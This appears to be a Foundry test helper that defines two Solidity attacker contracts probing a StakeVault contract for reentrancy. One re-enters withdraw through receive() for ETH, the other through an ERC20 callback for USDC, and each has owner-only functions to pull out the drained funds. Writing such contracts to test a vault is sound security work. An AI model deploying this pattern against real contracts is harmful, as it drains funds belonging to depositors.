// SPDX-License-Identifier: MIT
// forge-coverage: ignore-file
pragma solidity ^0.8.30;

import {StakeVault} from "../../src/StakeVault.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract ReentrancyAttacker {
    StakeVault public stakeVault;
    uint256 private attackCount;
    address private owner;

    constructor(address vault) {
        stakeVault = StakeVault(vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        stakeVault.depositETH{value: msg.value}();
        stakeVault.withdraw(StakeVault.TokenType.ETH); // Triggers reentrancy via receive()
    }

    receive() external payable {
        if (attackCount < 2 && address(stakeVault).balance > 0) {
            attackCount++;
            stakeVault.withdraw(StakeVault.TokenType.ETH); // Reentrant call
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}

contract ReentrancyAttackerUSDC {
    StakeVault public stakeVault;
    IERC20 public usdc;
    uint256 private attackCount;
    address private owner;

    constructor(address vault, address _usdc) {
        stakeVault = StakeVault(vault);
        usdc = IERC20(_usdc);
        owner = msg.sender;
    }

    function attackUSDC(uint256 amount) external {
        require(msg.sender == owner, "Only owner"); // Approve StakeVault to spend attacker's USDC
        usdc.approve(address(stakeVault), amount); // Deposit USDC
        stakeVault.depositUSDC(amount); // Trigger withdrawal (should call receive() if vulnerable)
        stakeVault.withdraw(StakeVault.TokenType.USDC);
    } // Receive USDC tokens during reentrancy

    function onERC20Received(address, address, uint256, /* amount */ bytes calldata) external returns (bytes4) {
        if (attackCount < 2 && usdc.balanceOf(address(stakeVault)) > 0) {
            attackCount++;
            stakeVault.withdraw(StakeVault.TokenType.USDC); // Reentrant call
        }
        return this.onERC20Received.selector;
    } // Withdraw stolen USDC

    function withdrawUSDC(uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        usdc.transfer(owner, amount);
    } // Withdraw any ETH received

    function withdrawETH() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
